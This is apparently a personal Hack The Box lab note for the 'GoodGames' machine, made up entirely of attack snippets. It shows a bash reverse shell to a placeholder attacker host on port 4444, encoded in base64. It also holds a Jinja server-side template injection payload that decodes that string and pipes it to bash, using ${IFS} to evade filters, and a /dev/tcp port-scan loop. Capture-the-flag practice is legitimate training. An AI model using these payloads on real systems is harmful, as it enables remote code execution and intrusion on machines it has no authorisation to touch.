# Hack The Box note

## GoodGames

```bash
# create base64 of reverse shell
echo -ne 'bash -i >& /dev/tcp/{HOST_IP}/4444 0>&1' | base64

# Python SSTI payload
# {{config.__class__.__init__.__globals__['os'].popen('echo${IFS}{PRECEEDING_BASE64_STRING}${IFS}|base64${IFS}-d|bash').read()}}

# instead of netcat command
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/{TARGET_IP}/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```
